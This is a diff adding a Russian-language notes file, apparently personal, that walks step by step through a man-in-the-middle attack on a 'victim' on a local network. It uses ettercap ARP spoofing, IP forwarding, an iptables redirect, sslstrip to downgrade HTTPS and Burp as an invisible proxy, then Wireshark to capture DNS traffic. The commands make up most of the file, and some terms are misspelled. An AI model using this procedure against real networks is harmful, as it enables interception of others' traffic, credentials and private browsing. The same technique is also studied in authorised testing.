@@ -1,0 +1,40 @@
+Спуфинг 
+Mitt attach- это перехват трагика третим лицом
+
+В основном http
+
+Можно использовать спуфинг атаку то есть стать переадрисантом всех сетевых пакетов 
+Мы будем для жертвы роутером и всё будет проходить через нас
+
+Sudo su
+
+1)ip a
+
+2)iwconfig
+
+3)echo "1" >  /proc/sys/net/ipv4/ip_forward 	включаем режим пересылки
+
+4)ettercap -G 
+
+Скандируем хсты 
+Target 1 -> ROUTERS
+Target 2 -> ЖЕРТВА
+MITP-ARK posing
+И ставим галочку snif...
+
+//burp
+5.1)sudo iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080 
+Перенаправление графика на порт 8080
+
+//wireshark
+5.5)sslstrip -l 8080 	будем все https открывать в http
+
+6)burp
+Proxy-option
+Ставим адрес  АТАКАУЮщего компа и порт 8080 
+Request- handling включаем галочку SUPPORT invisible proxy
+
+
+
+6)wireshark
+dns 	like all site
